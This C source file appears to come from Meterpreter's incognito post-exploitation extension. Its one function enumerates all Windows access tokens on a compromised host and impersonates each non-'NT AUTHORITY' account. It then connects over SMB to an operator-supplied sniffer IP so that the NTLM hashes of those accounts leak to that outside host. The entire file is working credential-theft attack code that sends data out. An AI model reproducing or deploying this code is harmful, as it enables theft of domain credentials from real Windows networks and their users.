#define _CRT_SECURE_NO_DEPRECATE 1
#include "common.h"
#include "common_metapi.h"
#include <stdio.h>
#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <aclapi.h>
#include <accctrl.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <lm.h>
#include <wchar.h>
#include "token_info.h"
#include "list_tokens.h"
#include "incognito.h"

// Send off hashes for all tokens to IP address with SMB sniffer running
DWORD request_incognito_snarf_hashes(Remote *remote, Packet *packet)
{
	DWORD num_tokens = 0, i;
	SavedToken *token_list = NULL;
	NETRESOURCEW nr;
	HANDLE saved_token;
	TOKEN_PRIVS token_privs;
	wchar_t conn_string[BUF_SIZE] = L"", domain_name[BUF_SIZE] = L"",
		return_value[BUF_SIZE] = L"", temp[BUF_SIZE] = L"";

	Packet *response = met_api->packet.create_response(packet);
	char *smb_sniffer_ip = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_SERVERNAME);

	// Initialise net_resource structure (essentially just set ip to that of smb_sniffer)
	if (_snwprintf(conn_string, BUF_SIZE, L"\\\\%S", smb_sniffer_ip) == -1)
	{
		conn_string[BUF_SIZE - 1] = '\0';
	}
	nr.dwType       = RESOURCETYPE_ANY;
	nr.lpLocalName  = NULL;
	nr.lpProvider   = NULL;
	nr.lpRemoteName = conn_string;

	// Save current thread token if one is currently being impersonated
	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &saved_token))
		saved_token = INVALID_HANDLE_VALUE;

	token_list = get_token_list(&num_tokens, &token_privs);
	if (!token_list)
	{
		met_api->packet.transmit_response(GetLastError(), remote, response);
		goto cleanup;
	}

	// Use every token and get hashes by connecting to SMB sniffer
	for (i = 0; i < num_tokens; i++)
	{
		if (token_list[i].token)
		{
			get_domain_from_token(token_list[i].token, domain_name, BUF_SIZE);
			// If token is not "useless" local account connect to sniffer
			// XXX This may need some expansion to support other languages
			if (_wcsicmp(domain_name, L"NT AUTHORITY"))
			{
				// Impersonate token
				ImpersonateLoggedOnUser(token_list[i].token);

				// Cancel previous connection to ensure hashes are sent and existing connection isn't reused
				WNetCancelConnection2W(nr.lpRemoteName, 0, TRUE);

				// Connect to smb sniffer
				if (!WNetAddConnection2W(&nr, NULL, NULL, 0))
				{
					// Revert to primary token
					RevertToSelf();
				}
			}
			CloseHandle(token_list[i].token);
		}
	}

	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);

cleanup:
	free(token_list);

	// Restore token impersonation
	if (saved_token != INVALID_HANDLE_VALUE)
	{
		ImpersonateLoggedOnUser(saved_token);
	}

	return ERROR_SUCCESS;
}
